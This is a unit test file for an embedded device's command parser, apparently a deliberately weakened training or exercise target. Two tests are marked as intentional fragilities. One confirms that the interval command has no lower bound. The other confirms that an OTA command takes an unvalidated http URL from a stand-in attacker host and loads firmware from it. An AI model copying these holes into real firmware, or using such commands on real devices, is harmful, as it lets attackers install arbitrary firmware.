#include <unity.h>
#include "commands.h"

void setUp() {}
void tearDown() {}

void test_set_interval_valid() {
  Command c = parseCommand("set_interval:10");
  TEST_ASSERT_TRUE(c.type == CmdType::SetInterval);
  TEST_ASSERT_EQUAL(10, c.value);
}

void test_set_interval_accepts_tiny_value_without_bounds() {
  // Fragilidade intencional (F04): não há limite inferior razoável
  Command c = parseCommand("set_interval:1");
  TEST_ASSERT_TRUE(c.type == CmdType::SetInterval);
  TEST_ASSERT_EQUAL(1, c.value);
}

void test_set_interval_rejects_non_positive() {
  TEST_ASSERT_TRUE(parseCommand("set_interval:0").type == CmdType::Unknown);
  TEST_ASSERT_TRUE(parseCommand("set_interval:abc").type == CmdType::Unknown);
}

void test_simple_commands() {
  TEST_ASSERT_TRUE(parseCommand("debug_on").type == CmdType::DebugOn);
  TEST_ASSERT_TRUE(parseCommand("debug_off").type == CmdType::DebugOff);
  TEST_ASSERT_TRUE(parseCommand("reboot").type == CmdType::Reboot);
}

void test_ota_takes_any_url() {
  // Fragilidade intencional (F05): aceita http:// sem validação
  Command c = parseCommand("ota:http://evil.example/fw.bin");
  TEST_ASSERT_TRUE(c.type == CmdType::Ota);
  TEST_ASSERT_EQUAL_STRING("http://evil.example/fw.bin", c.arg.c_str());
}

void test_ota_without_url_is_unknown() {
  TEST_ASSERT_TRUE(parseCommand("ota:").type == CmdType::Unknown);
}

void test_unknown() {
  TEST_ASSERT_TRUE(parseCommand("format_flash").type == CmdType::Unknown);
}

int main() {
  UNITY_BEGIN();
  RUN_TEST(test_set_interval_valid);
  RUN_TEST(test_set_interval_accepts_tiny_value_without_bounds);
  RUN_TEST(test_set_interval_rejects_non_positive);
  RUN_TEST(test_simple_commands);
  RUN_TEST(test_ota_takes_any_url);
  RUN_TEST(test_ota_without_url_is_unknown);
  RUN_TEST(test_unknown);
  return UNITY_END();
}
